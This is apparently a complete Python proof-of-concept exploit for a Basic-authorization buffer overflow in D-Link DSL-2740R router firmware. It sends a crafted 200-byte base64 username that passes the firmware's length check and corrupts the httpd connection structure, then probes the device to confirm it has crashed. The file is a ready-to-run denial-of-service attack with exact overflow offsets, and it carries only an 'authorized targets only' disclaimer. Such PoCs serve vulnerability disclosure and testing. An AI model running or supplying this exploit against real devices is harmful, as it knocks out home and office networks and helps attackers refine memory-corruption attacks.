#!/usr/bin/env python3
"""
Non-destructive PoC — D-Link DSL-2740R EU_1.17 Basic-authorization connection-structure overflow
(advisory: FIND-0001-authorization-header-overflow)

For authorized targets only. Single request; writes nothing to flash; changes no configuration.
Demonstrated effect: the overflow corrupts the httpd connection structure, crashing the web
service / rebooting the device (DoS).
Decision logic: if the device still answers the post-attack liveness probe -> not affected;
                connection reset/timeout/failed probe -> vulnerability triggered.

Usage: python3 poc_find0001.py <target_ip> [port]
"""
import base64
import socket
import sys


def http_get_with_auth(host: str, port: int, auth_header: bytes, timeout: float = 5.0) -> bytes:
    req = (
        b"GET / HTTP/1.0\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Authorization: Basic " + auth_header + b"\r\n"
        b"\r\n"
    )
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.sendall(req)
        try:
            return s.recv(512)
        except socket.timeout:
            return b""


def probe_alive(host: str, port: int, timeout: float = 5.0) -> bool:
    try:
        resp = http_get_with_auth(host, port, base64.b64encode(b"admin:admin"), timeout)
        return len(resp) > 0
    except OSError:
        return False


def main() -> int:
    if len(sys.argv) < 2:
        print(__doc__)
        return 2
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80

    print(f"[*] Target {host}:{port}")
    if not probe_alive(host, port):
        print("[-] Liveness probe failed: web service unreachable, aborting")
        return 1
    print("[+] Liveness probe OK (401/200 response)")

    # 200-byte username + 1-byte password -> base64 <= 340 chars (passes the firmware's 0x154 check)
    # decodes to 202 bytes -> overflows 137 bytes past conn+0x3da0 with controlled data
    payload = b"U" * 200 + b":" + b"p"
    token = base64.b64encode(payload)
    assert len(token) <= 340, "token must be <=340 chars to pass the firmware length check"
    print(f"[*] Sending overflow request (base64 token {len(token)} chars, decoded {len(payload)} bytes)")

    try:
        resp = http_get_with_auth(host, port, token, timeout=5.0)
        print(f"[*] Overflow request response: {resp[:80]!r}")
    except OSError as e:
        print(f"[!] Overflow request connection error: {e} (crash indicator)")

    import time
    time.sleep(2)
    if probe_alive(host, port):
        print("[-] Post-attack probe OK: target may not be affected (or httpd recovered)")
        return 1
    print("[+] Web service unresponsive after overflow — vulnerability triggered, DoS confirmed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
